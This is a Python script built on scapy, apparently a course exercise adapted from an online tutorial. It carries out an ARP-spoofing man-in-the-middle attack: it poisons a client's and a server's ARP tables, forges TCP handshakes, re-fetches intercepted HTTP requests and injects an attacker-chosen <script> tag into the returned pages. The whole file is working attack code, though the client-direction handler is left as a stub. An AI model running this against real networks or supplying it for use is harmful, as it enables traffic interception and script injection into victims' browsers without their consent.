# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import requests
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    arp_packet= Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=IP)
    target_mac= srp(arp_packet, timeout=2, verbose=False)[0][0][1].hwsrc
    return target_mac


def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
    spoof_packet = ARP(op=2, psrc=src_ip, hwsrc=src_mac, pdst=dst_ip, hwdst=dst_mac)
    send(spoof_packet, verbose=False)


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    restore_packet = ARP(op=2, psrc=srcIP, hwsrc=srcMAC, pdst=dstIP, hwdst=dstMAC)
    send(restore_packet, verbose=False)


# TODO: handle intercepted packets
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attckerIP, attackerMAC, script
    injection = '<script>{0}</script>'.format(script)
    if TCP in packet and IP in packet and Ether in packet:
        dst_ip = packet[IP].dst
        dst_mac = packet[Ether].dst
        if dst_ip == clientIP and dst_mac == attackerMAC:
            print(1)
            
                
    

        elif dst_ip == serverIP and dst_mac == attackerMAC:
            if packet[TCP].flags == 2:
                send(IP(dst=packet[IP].src, src=packet[IP].dst)/TCP(dport=packet[TCP].sport, sport=packet[TCP].dport,ack=packet[TCP].seq + 1, flags='SA'))
            elif packet.haslayer(Raw):
                send(IP(dst=packet[IP].src, src=packet[IP].dst)/TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].ack, ack=packet[TCP].seq + len(packet.load), flags='A'))

                lines = packet.load.decode('utf-8').strip().splitlines()
                uri = lines[0].split()[1]
                headers = {}
                for line in lines[1:]:
                    words = line.split(':')
                    headers[words[0]] = words[1].strip()
                response = requests.get('http://' + headers['Host'] + uri, headers=headers)
                
                client_response = 'HTTP/1.1 {} OK\r\n'.format(response.status_code)
                for k, v in response.headers.items():
                    if k == 'Content-Length' and response.status_code == 200:
                        client_response += '{}: {}\r\n'.format(k, int(v) + len(injection))
                    else:
                        client_response += '{}: {}\r\n'.format(k, v)
                client_response += '\r\n'
                if response.status_code == 200:
                    body = response.text.replace('</body>', injection + '</body>')
                    client_response += body

                send(IP(dst=packet[IP].src, src=packet[IP].dst)/TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].ack, ack=packet[TCP].seq + len(packet.load), flags='A') / client_response.encode())
            elif packet[TCP].flags == 17: # FIN-ACK
                send(IP(dst=packet[IP].src, src=packet[IP].dst)/TCP(dport=packet[TCP].sport, sport=packet[TCP].dport,seq=packet[TCP].ack, ack=packet[TCP].seq + 1, flags='FA'))


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    script = args.script
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)

